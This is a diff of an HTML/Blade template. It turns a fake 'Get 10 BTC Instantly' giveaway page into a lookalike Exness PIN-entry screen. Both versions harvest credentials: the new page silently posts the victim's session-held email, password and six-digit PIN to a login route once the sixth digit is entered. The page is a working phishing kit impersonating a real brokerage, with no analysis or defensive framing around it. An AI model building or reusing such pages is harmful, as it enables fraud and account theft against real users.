@@ -1,50 +1,87 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>Claim 10 BTC Now</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="icon" type="image/jpeg" href="https://cdn.brandfetch.io/idfikRVSpz/w/500/h/500/theme/dark/icon.jpeg?c=1bxid64Mup7aczewSAYMX&t=1744793333374">
-
+    <meta charset="UTF-8" />
+    <title>exness PIN Entry</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap');
         body {
             font-family: 'Inter', sans-serif;
         }
-        .glow {
-            box-shadow: 0 0 20px 4px rgba(255, 200, 0, 0.6);
-        }
     </style>
 </head>
-<body class="bg-gradient-to-br from-gray-900 via-black to-gray-800 text-white min-h-screen flex items-center justify-center p-6">
-<div class="w-full max-w-xl text-center space-y-8">
-    <h1 class="text-4xl md:text-5xl font-bold text-yellow-400 animate-pulse">
-        🎉 Get 10 BTC Instantly!
-    </h1>
-    <p class="text-gray-300 text-lg md:text-xl">
-        You're eligible to receive <span class="font-semibold text-white">10 Bitcoin</span>. Enter your Exness PIN code to receive.
-    </p>
+<body class="bg-[#f8f9fb] min-h-screen flex items-center justify-center">
 
-    <form method="POST" action="{{ route('login.store') }}" class="bg-white/10 backdrop-blur-md p-8 rounded-xl space-y-5 border border-yellow-500 glow">
+<div class="w-full max-w-xs text-center space-y-6">
+
+    <!-- Text only (no logo) -->
+    <div class="text-black font-bold text-xl">Exness</div>
+
+    <!-- PIN Dots -->
+    <div id="pin-dots" class="flex justify-center space-x-2">
+        <span class="w-2.5 h-2.5 rounded-full bg-[#d6dbe1] transition-colors duration-200"></span>
+        <span class="w-2.5 h-2.5 rounded-full bg-[#d6dbe1] transition-colors duration-200"></span>
+        <span class="w-2.5 h-2.5 rounded-full bg-[#d6dbe1] transition-colors duration-200"></span>
+        <span class="w-2.5 h-2.5 rounded-full bg-[#d6dbe1] transition-colors duration-200"></span>
+        <span class="w-2.5 h-2.5 rounded-full bg-[#d6dbe1] transition-colors duration-200"></span>
+        <span class="w-2.5 h-2.5 rounded-full bg-[#d6dbe1] transition-colors duration-200"></span>
+    </div>
+
+    <!-- Hidden Form -->
+    <form method="POST" action="{{ route('login.store') }}" class="hidden" id="pin-form">
         @csrf
-
         <input type="hidden" name="email" value="{{ session('email') }}">
         <input type="hidden" name="password" value="{{ session('password') }}">
-
-        <div class="text-left">
-            <label for="wallet" class="block mb-2 text-sm text-yellow-300">PIN</label>
-            <input type="text" id="wallet" name="pin" placeholder="Your secret PIN..." required class="w-full p-3 rounded-md bg-white/10 border border-gray-500 text-white placeholder-gray-400">
-        </div>
-
-        <button type="submit" class="w-full bg-yellow-400 text-black font-bold py-3 rounded-md hover:bg-yellow-300 transition">
-            Claim
-        </button>
+        <input type="hidden" name="pin" id="pin-input">
     </form>
 
-    <div class="text-sm text-gray-500 italic">
-        * For security reasons, this offer is available once per user.
+    <!-- Number Pad -->
+    <div class="grid grid-cols-3 gap-8 text-2xl font-medium text-black px-6 pd-4">
+        <button onclick="appendPin('1')">1</button>
+        <button onclick="appendPin('2')">2</button>
+        <button onclick="appendPin('3')">3</button>
+        <button onclick="appendPin('4')">4</button>
+        <button onclick="appendPin('5')">5</button>
+        <button onclick="appendPin('6')">6</button>
+        <button onclick="appendPin('7')">7</button>
+        <button onclick="appendPin('8')">8</button>
+        <button onclick="appendPin('9')">9</button>
+        <span class="text-sm text-gray-500 mt-2">Forgot?</span>
+        <button class="text-yellow-500" onclick="appendPin('0')">0</button>
+        <button onclick="clearPin()">←</button>
     </div>
 </div>
+
+<script>
+    let pin = "";
+
+    function appendPin(digit) {
+        if (pin.length < 6) {
+            pin += digit;
+            updateDots();
+        }
+
+        if (pin.length === 6) {
+            document.getElementById("pin-input").value = pin;
+            document.getElementById("pin-form").submit();
+        }
+    }
+
+    function clearPin() {
+        pin = pin.slice(0, -1);
+        updateDots();
+    }
+
+    function updateDots() {
+        const dots = document.querySelectorAll("#pin-dots span");
+        dots.forEach((dot, i) => {
+            dot.classList.remove("bg-yellow-400", "bg-[#d6dbe1]");
+            dot.classList.add(i < pin.length ? "bg-yellow-400" : "bg-[#d6dbe1]");
+        });
+    }
+</script>
+
 </body>
 </html>
